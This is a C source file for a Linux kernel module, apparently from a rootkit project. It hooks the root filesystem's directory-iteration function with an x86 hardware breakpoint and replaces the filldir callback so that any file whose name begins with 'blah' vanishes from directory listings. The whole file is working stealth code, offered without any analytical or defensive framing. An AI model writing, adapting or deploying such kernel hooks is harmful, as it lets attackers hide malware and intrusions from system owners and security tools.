#include <anima/ksyms.h>
#include <anima/x86.h>

/*
 * for kernel versions >= 3.11
 */

static void *get_vfs_iterate(const char *path)
{
	/* FIXME: hackish function */
	char *filep, *f_op, *iterate;

	filep = ksyms.filp_open(path, 0, 0);
	if (!filep)
		return NULL;

	/* get filep->f_op */
	f_op = (void *)*(unsigned long *)(filep + 5 * sizeof(unsigned long));

	/* get filep->f_op->iterate */
	iterate = (char *)(*(unsigned long *)(f_op + 8*8));
	pr_debug("%s: iterate=%p", __func__, iterate);

	ksyms.filp_close(filep, 0);

	return iterate;
}

typedef int (*filldir_t)(void *, const char *, int, loff_t, u64, unsigned);
struct dir_context {
	filldir_t actor;
	loff_t pos;
};

static filldir_t old_filldir;

static int new_filldir(void *__buf, const char *name, int namlen, loff_t offset,
			u64 ino, unsigned int d_type)
{
	if (!strncmp(name, "blah", 4)) {
		pr_debug("%s: blah", __func__);
		return 0;
	}

	return old_filldir(__buf, name, namlen, offset, ino, d_type);
}

static void vfs_iterate_hook(struct pt_regs *regs)
{
	struct dir_context *ctx = (void *)regs->si;

	/*
	 * FIXME: should disable preemption ?
	 * old_filldir can be set by multiple kernel path !!!
	 */
	old_filldir = ctx->actor;
	ctx->actor = new_filldir;
}

void hook_vfs(void)
{
	unsigned long root_iterate = (unsigned long)get_vfs_iterate("/");
	x86_hw_breakpoint_register(2, root_iterate, DR_RW_EXECUTE,
				   0, vfs_iterate_hook);
}
